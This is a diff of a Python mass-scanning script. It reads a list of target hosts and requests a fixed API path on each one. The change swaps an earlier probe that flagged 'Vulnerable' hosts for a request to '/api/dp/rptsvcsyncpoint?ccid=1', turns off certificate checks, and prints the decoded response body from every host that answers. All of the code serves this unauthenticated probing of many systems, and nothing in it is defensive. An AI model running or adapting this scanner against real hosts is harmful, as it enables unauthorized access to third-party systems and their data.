@@ -24,7 +24,7 @@ def banner():
 
 def usage():
     parser = argparse.ArgumentParser(description="注意：每行IP需要指明协议，即以协议开头");
-    parser.add_argument("file",
+    parser.add_argument("-f", "--file",
                         help="包含IP列表的文件，IP每行一个");
     args = parser.parse_args();
     ip_file = args.file
@@ -41,45 +41,42 @@ def main():
             lines = f_r.readlines();
             for line in lines:
                 ip = line.strip("\n");
-                full_url = ip + "/api/dbstat/gettablessize";
+                full_url = ip + "/api/dp/rptsvcsyncpoint?ccid=1";
+                
                 try:
-                    if full_url.startswith("https"):
-                        r = requests.get(full_url, verify=False);
-                    elif full_url.startswith("http"):
-                        r = requests.get(full_url);
-                    else:
-                        print(ip + "-----None web protocol, exiting...");
-                        exit();
+                    r = requests.get(full_url, verify=False);
                 except requests.exceptions.SSLError:
                     print(ip + "-----Exception: requests.exceptions.SSLError");
+                    print()
                     continue;
                 except requests.exceptions.ConnectionError:
                     print(ip + "-----Exception: requests.exceptions.ConnectionError");
+                    print()
                     continue;
+                
                 if r.status_code == 500:
                     print(ip + "-----500: Internal Error");
+                    print()
                     continue;
                 elif r.status_code == 401:
                     print(ip + "-----401: Unauthorized");
+                    print()
                     continue;
                 elif r.status_code == 404:
                     print(ip + "-----404: Not Found");
+                    print()
                     continue;
                 elif r.status_code == 400:
                     print(ip + "-----400: Bad Request");
+                    print()
                     continue;
                 elif r.status_code == 200:
-                    if "success" in r.text:
-                        print(ip + "-----200: Vulnerable");
-                        f_w.write(ip + "\n");
-                    elif "false" in r.text:
-                        print(ip + "-----200: Not Vulnerable");
-                        continue;
-                    else:
-                        print(ip + "-----200: 需要进一步查看");
-                        f_w.write(ip + "-----200: 需要进一步查看" + "\n");
+                    print(full_url)
+                    print( r.text.encode('latin-1').decode('unicode_escape') )
+                    print()
                 else:
                     print(full_url + "-----Return code unknown, exiting...");
+                    print()
                     exit();
 
 main();
